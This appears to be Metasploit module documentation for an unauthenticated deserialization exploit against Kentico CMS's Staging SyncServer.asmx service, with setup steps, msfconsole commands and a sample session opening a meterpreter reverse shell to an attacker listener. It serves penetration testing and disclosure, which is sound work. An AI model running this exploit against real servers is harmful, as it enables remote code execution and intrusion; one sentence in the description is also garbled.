## Vulnerable Application

[Kentico CMS](www.kentico.com) CMS platform versions 12.0.14 and earlier are
affected by an unauthenticated deserialization vulnerability in the Staging
Service which can be leveraged by an attacker to execute arbitrary commands in
the context of the target server process (usually either `NT AUTHORITY\NETWORK
SERVICE` or `NT AUTHORITY\SYSTEM`). The vulnerability is triggered
by sending a HTTP POST request to the SyncServer.asmx interface
`ProcessSynchronizationTaskData` method `stagingTaskData` parameter request path
in HTTP GET requests sent to the built-in web server. This module has been
tested successfully on Windows 10 using exec and adduser payloads against
Kentico v11.

The vulnerable application is available for download at:

  * https://d82ujmuzqhypi.cloudfront.net/Kentico_11_0_trial.exe
  * https://d82ujmuzqhypi.cloudfront.net/Kentico_12_0_trial.exe
  * https://www.kentico.com/download-demo

## Verification Steps
  1. Install a vulnerable Kentico CMS Trial version.
  2. Access web instance admin interface at /admin/
  3. Default credentials are 'administrator' with blank password.
  4. Navigate to `Settings`, then expand `Settings` > `Versioning & Synchronization` > `Staging`
  5. Check `Enable Staging Service` and click `Save`
  6. Start `msfconsole`
  7. Do `use exploit/windows/http/kentico_staging_syncserver`
  8. Do `set RHOSTS ip` (Trial is limited to 127.0.0.1 remote HTTP clients, but paid versions are public websites)
  9. Do `set RPORT port` (installs with a random port within IISExpress for at least Trial versions)
  10. Do `check`
  11. Verify the target is detected
  12. Do `set PAYLOAD cmd/windows/generic`
  13. Do `set CMD calc`
  14. Do `exploit`
  15. Verify `calc.exe` launches. 

## Scenarios

### Kentico CMS v11.0 trial on Windows 7 SP 1 x64

```
msf5 exploit(windows/http/kentico_staging_syncserver) > show options 

Module options (exploit/windows/http/kentico_staging_syncserver):

   Name       Current Setting                              Required  Description
   ----       ---------------                              --------  -----------
   Proxies                                                 no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.159.31                               yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80                                           yes       The target port (TCP)
   SRVHOST    0.0.0.0                                      yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080                                         yes       The local port to listen on.
   SSL        false                                        no        Negotiate SSL/TLS for outgoing connections
   SSLCert                                                 no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /Kentico11/CMSPages/Staging/SyncServer.asmx  yes       Path to SyncServer.asmx
   URIPATH                                                 no        The URI to use for this exploit (default is random)
   VHOST      localhost                                    no        HTTP server virtual host


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.159.128  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows EXE Dropper


msf5 exploit(windows/http/kentico_staging_syncserver) > exploit

[*] Started reverse TCP handler on 192.168.159.128:4444 
[*] Command Stager progress -  24.99% done (2999/12002 bytes)
[*] Command Stager progress -  49.98% done (5998/12002 bytes)
[*] Command Stager progress -  74.96% done (8997/12002 bytes)
[*] Sending stage (201283 bytes) to 192.168.159.31
[*] Command Stager progress -  99.83% done (11982/12002 bytes)
[*] Meterpreter session 2 opened (192.168.159.128:4444 -> 192.168.159.31:51599) at 2020-05-04 09:51:29 -0400
[*] Command Stager progress - 100.00% done (12002/12002 bytes)

meterpreter > sysinfo
Computer        : WIN-9NSI4A6AIHJ
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
meterpreter >
```

## Notes

  1. The IISExpress config is located in ~/Documents/IISExpress/config/applicationhost.config
  2. Port number can be changed or allow remote access by replacing 'localhost' with '*'
  3. To run IIS on command line, C:\PROGRA~1\IIS Express\iisexpress.exe /site:Kentico11 (etc)
  4. It might be possible to use a CmdStager or FileDropper but couldn't get it working in time. Might be a string limit and has issues with Unicode.
  5. Some reverse or bind payloads work if the environment is right.
  6. Other serialized injections are possible with `ysoserial.exe -f SoapFormatter` but untested.
